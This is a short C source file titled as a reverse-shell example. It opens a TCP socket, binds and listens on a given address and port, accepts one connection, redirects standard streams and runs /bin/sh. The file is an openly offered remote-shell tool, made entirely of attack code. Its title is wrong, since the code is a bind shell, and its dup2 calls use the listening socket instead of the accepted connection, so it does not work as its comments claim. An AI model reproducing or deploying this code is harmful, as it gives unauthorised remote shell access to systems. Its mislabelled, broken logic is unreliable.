/**
 TITLE: C Reverse Shell Example
 Author: Guillem Alminyana
 License: GPLv3 or Later
 Description: Accepts incoming connection and spawns shell

 Use: ./shell IP PORT
**/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_CONNECTIONS 1

int main (int argc, char * argv[]) {

    int port = atoi(argv[2]);
    char * ip_address = argv[1];
    char * const execve_params[] = {"/bin/sh", NULL};
    char shell_to_exec[] = "/bin/sh";
	int fd_accepted_connection;

    struct sockaddr_in my_sockaddr;

    int my_socket = socket(AF_INET, SOCK_STREAM, 0);              //<- Create the Socket

    my_sockaddr.sin_family = AF_INET;                             //<- Put required info in sockaddr_in: IPv4 Protocol
    my_sockaddr.sin_port = htons(port);                           //   Port
    my_sockaddr.sin_addr.s_addr = inet_addr(ip_address);          //   IP Address

	bind(my_socket, (struct sockaddr *) &my_sockaddr,             //<- Bind the Connnection data to the socket,
	     sizeof(my_sockaddr));
	
	listen(my_socket, MAX_CONNECTIONS);                           //<- Listen incoming connections for the socket
	
	fd_accepted_connection = accept(my_socket, NULL, NULL);       //<- Accept incoming connection. Srtop until a connection in
	                                                              // &client and &sockaddr_len can be NULL

    dup2(my_socket, 0);                                           //<- Duplicate STDIN, STDOUT and STDERR
    dup2(my_socket, 1);                                           //   to make the shell output be redirected
    dup2(my_socket, 2);                                           //   to the socket

    execve(shell_to_exec, execve_params, NULL);                   //<- EXECVE syscall

    return 0;
}
